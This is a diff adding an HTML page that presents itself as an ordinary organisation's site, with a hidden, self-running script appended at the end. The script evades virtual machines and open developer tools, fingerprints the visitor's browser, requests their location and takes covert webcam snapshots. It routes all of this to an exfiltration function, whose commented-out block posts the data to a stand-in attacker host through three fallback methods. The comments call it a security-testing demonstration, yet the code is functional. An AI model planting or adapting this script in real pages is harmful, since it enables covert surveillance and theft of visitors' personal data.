@@ -1,0 +1,343 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Legitimate Website</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            line-height: 1.6;
+            margin: 0;
+            padding: 20px;
+            color: #333;
+        }
+        header {
+            background-color: #4CAF50;
+            padding: 20px;
+            color: white;
+            text-align: center;
+        }
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 20px;
+        }
+        footer {
+            background-color: #333;
+            color: white;
+            text-align: center;
+            padding: 20px;
+            margin-top: 20px;
+        }
+        .hidden {
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <header>
+        <h1>Welcome to Our Legitimate Website</h1>
+        <p>Providing valuable information and services since 2010</p>
+    </header>
+    
+    <div class="container">
+        <h2>About Us</h2>
+        <p>We are a legitimate organization dedicated to providing high-quality content and services to our users. Our team of experts works tirelessly to ensure that you have the best experience on our website.</p>
+        
+        <h2>Our Services</h2>
+        <ul>
+            <li>Professional consulting</li>
+            <li>Educational resources</li>
+            <li>Community support</li>
+            <li>Technical documentation</li>
+        </ul>
+        
+        <h2>Latest News</h2>
+        <article>
+            <h3>New Features Released</h3>
+            <p>We are excited to announce the release of several new features that will enhance your experience on our platform. These features include improved search functionality, a redesigned user interface, and enhanced security measures.</p>
+        </article>
+        
+        <article>
+            <h3>Upcoming Events</h3>
+            <p>Join us for our annual conference on June 15-17, 2025. The event will feature keynote speakers, workshops, and networking opportunities. Early bird registration is now open!</p>
+        </article>
+    </div>
+    
+    <footer>
+        <p>&copy; 2025 Legitimate Website. All rights reserved.</p>
+    </footer>
+
+    <!-- MALICIOUS SCRIPT HIDDEN IN LEGITIMATE WEBSITE -->
+    <!-- This script would be obfuscated in a real attack -->
+    <script class="hidden">
+        // Malicious script for demonstration purposes only
+        // DO NOT USE THIS CODE - FOR SECURITY TESTING ONLY
+        
+        // Function to check if running in a virtual environment
+        function checkForVirtualEnvironment() {
+            const signs = [
+                navigator.userAgent.indexOf("VMware") > -1,
+                navigator.userAgent.indexOf("VirtualBox") > -1,
+                screen.width === 800 && screen.height === 600,
+                navigator.hardwareConcurrency < 2,
+                navigator.plugins.length === 0,
+                eval.toString().length !== 33
+            ];
+            return signs.some(sign => sign === true);
+        }
+        
+        // Function to check if developer tools are open
+        function checkForDevTools() {
+            const threshold = 160;
+            const widthThreshold = window.outerWidth - window.innerWidth > threshold;
+            const heightThreshold = window.outerHeight - window.innerHeight > threshold;
+            return widthThreshold || heightThreshold;
+        }
+        
+        // Function to get geolocation
+        function getLocation() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(position => {
+                    const locationData = {
+                        latitude: position.coords.latitude,
+                        longitude: position.coords.longitude,
+                        accuracy: position.coords.accuracy,
+                        timestamp: new Date().toISOString()
+                    };
+                    
+                    // Exfiltrate location data
+                    exfiltrateData('location', locationData);
+                });
+            }
+        }
+        
+        // Function to access webcam
+        function accessWebcam() {
+            if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+                navigator.mediaDevices.getUserMedia({ video: true })
+                    .then(stream => {
+                        // Create hidden video element
+                        const video = document.createElement('video');
+                        video.style.display = 'none';
+                        video.srcObject = stream;
+                        document.body.appendChild(video);
+                        video.play();
+                        
+                        // Take snapshot after 2 seconds
+                        setTimeout(() => {
+                            const canvas = document.createElement('canvas');
+                            canvas.width = video.videoWidth;
+                            canvas.height = video.videoHeight;
+                            const ctx = canvas.getContext('2d');
+                            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                            
+                            // Get image data
+                            const imageData = canvas.toDataURL('image/jpeg');
+                            
+                            // Exfiltrate image data
+                            exfiltrateData('webcam', { image: imageData });
+                            
+                            // Clean up
+                            stream.getTracks().forEach(track => track.stop());
+                            document.body.removeChild(video);
+                        }, 2000);
+                    })
+                    .catch(error => {
+                        console.error("Webcam access error:", error);
+                    });
+            }
+        }
+        
+        // Function to collect browser data
+        function collectBrowserData() {
+            const browserData = {
+                userAgent: navigator.userAgent,
+                language: navigator.language,
+                platform: navigator.platform,
+                cookiesEnabled: navigator.cookieEnabled,
+                doNotTrack: navigator.doNotTrack,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                screenWidth: screen.width,
+                screenHeight: screen.height,
+                colorDepth: screen.colorDepth,
+                devicePixelRatio: window.devicePixelRatio,
+                hardwareConcurrency: navigator.hardwareConcurrency,
+                referrer: document.referrer,
+                url: window.location.href,
+                localStorage: !!window.localStorage,
+                sessionStorage: !!window.sessionStorage,
+                indexedDB: !!window.indexedDB,
+                addBehavior: !!document.body.addBehavior,
+                openDatabase: !!window.openDatabase,
+                cpuClass: navigator.cpuClass,
+                plugins: Array.from(navigator.plugins).map(p => p.name),
+                mimeTypes: Array.from(navigator.mimeTypes).map(m => m.type),
+                fonts: detectFonts(),
+                canvas: getCanvasFingerprint(),
+                webgl: getWebGLFingerprint()
+            };
+            
+            // Exfiltrate browser data
+            exfiltrateData('browser', browserData);
+        }
+        
+        // Function to detect installed fonts
+        function detectFonts() {
+            const fontList = ['Arial', 'Courier New', 'Georgia', 'Times New Roman', 'Verdana', 'Tahoma', 'Trebuchet MS'];
+            const detectedFonts = [];
+            
+            for (const font of fontList) {
+                const div = document.createElement('div');
+                div.style.fontFamily = `'${font}', monospace`;
+                div.style.fontSize = '72px';
+                div.style.position = 'absolute';
+                div.style.left = '-9999px';
+                div.style.visibility = 'hidden';
+                div.textContent = 'mmmmmmmmmmlli';
+                document.body.appendChild(div);
+                
+                const width = div.offsetWidth;
+                document.body.removeChild(div);
+                
+                const div2 = document.createElement('div');
+                div2.style.fontFamily = 'monospace';
+                div2.style.fontSize = '72px';
+                div2.style.position = 'absolute';
+                div2.style.left = '-9999px';
+                div2.style.visibility = 'hidden';
+                div2.textContent = 'mmmmmmmmmmlli';
+                document.body.appendChild(div2);
+                
+                const width2 = div2.offsetWidth;
+                document.body.removeChild(div2);
+                
+                if (width !== width2) {
+                    detectedFonts.push(font);
+                }
+            }
+            
+            return detectedFonts;
+        }
+        
+        // Function to get canvas fingerprint
+        function getCanvasFingerprint() {
+            const canvas = document.createElement('canvas');
+            const ctx = canvas.getContext('2d');
+            const txt = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*()_+-={}|[]\\:";\'<>?,./';
+            
+            ctx.textBaseline = 'top';
+            ctx.font = '14px Arial';
+            ctx.fillStyle = '#f60';
+            ctx.fillRect(125, 1, 62, 20);
+            ctx.fillStyle = '#069';
+            ctx.fillText(txt, 2, 15);
+            ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
+            ctx.fillText(txt, 4, 17);
+            
+            return canvas.toDataURL();
+        }
+        
+        // Function to get WebGL fingerprint
+        function getWebGLFingerprint() {
+            const canvas = document.createElement('canvas');
+            const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+            
+            if (!gl) {
+                return null;
+            }
+            
+            const info = {
+                vendor: gl.getParameter(gl.VENDOR),
+                renderer: gl.getParameter(gl.RENDERER),
+                version: gl.getParameter(gl.VERSION),
+                shadingLanguageVersion: gl.getParameter(gl.SHADING_LANGUAGE_VERSION),
+                extensions: gl.getSupportedExtensions()
+            };
+            
+            return info;
+        }
+        
+        // Function to exfiltrate data
+        function exfiltrateData(type, data) {
+            // In a real attack, this would send data to a malicious server
+            // This is just a simulation for security testing
+            console.log(`[EXFILTRATION SIMULATION] Type: ${type}, Data:`, data);
+            
+            // Simulated exfiltration (would be obfuscated in a real attack)
+            /*
+            const exfilUrl = 'https://malicious-server.com/collect';
+            const payload = JSON.stringify({
+                type: type,
+                data: data,
+                timestamp: new Date().toISOString(),
+                victim_id: generateVictimId()
+            });
+            
+            // Using fetch API
+            fetch(exfilUrl, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: payload
+            }).catch(() => {
+                // Fallback methods if fetch fails
+                
+                // Method 1: Image beacon
+                const img = new Image();
+                img.src = `${exfilUrl}?data=${encodeURIComponent(payload)}`;
+                
+                // Method 2: XMLHttpRequest
+                const xhr = new XMLHttpRequest();
+                xhr.open('POST', exfilUrl, true);
+                xhr.setRequestHeader('Content-Type', 'application/json');
+                xhr.send(payload);
+            });
+            */
+        }
+        
+        // Function to generate a unique victim ID
+        function generateVictimId() {
+            // Generate a pseudo-random ID based on browser properties
+            const components = [
+                navigator.userAgent,
+                navigator.language,
+                screen.width,
+                screen.height,
+                new Date().getTimezoneOffset()
+            ];
+            
+            let hash = 0;
+            const str = components.join('');
+            
+            for (let i = 0; i < str.length; i++) {
+                const char = str.charCodeAt(i);
+                hash = ((hash << 5) - hash) + char;
+                hash = hash & hash; // Convert to 32bit integer
+            }
+            
+            return Math.abs(hash).toString(16);
+        }
+        
+        // Main function
+        function main() {
+            // Only run if not in a virtual environment or developer tools
+            if (!checkForVirtualEnvironment() && !checkForDevTools()) {
+                // Collect browser data
+                collectBrowserData();
+                
+                // Try to get location after a delay
+                setTimeout(getLocation, 3000);
+                
+                // Try to access webcam after a delay
+                setTimeout(accessWebcam, 5000);
+            }
+        }
+        
+        // Execute main function after a delay
+        setTimeout(main, 2000);
+    </script>
+</body>
+</html>
